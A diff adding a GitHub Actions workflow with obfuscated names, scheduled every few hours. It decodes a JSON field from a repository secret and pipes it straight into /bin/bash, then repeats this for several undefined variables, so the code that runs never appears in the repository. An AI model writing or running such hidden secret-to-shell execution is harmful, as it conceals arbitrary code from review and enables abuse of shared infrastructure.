@@ -1,0 +1,23 @@
+name: mingquanshu2121
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mingquanshu2121
+        env:
+          ez555: ${{ secrets.ez555 }}
+        run: |
+          echo $ez555 | jq -r .wv0 | /bin/bash
+          echo $j718 | jq -r .clmg844 | /bin/bash
+          echo $dg5 | jq -r .etf407 | /bin/bash
+          echo $wenuo86848 | jq -r .wr101 | /bin/bash
+          echo $nm073 | jq -r .cwst22 | /bin/bash
+          echo $grhh20736 | jq -r .jiln0838 | /bin/bash
+
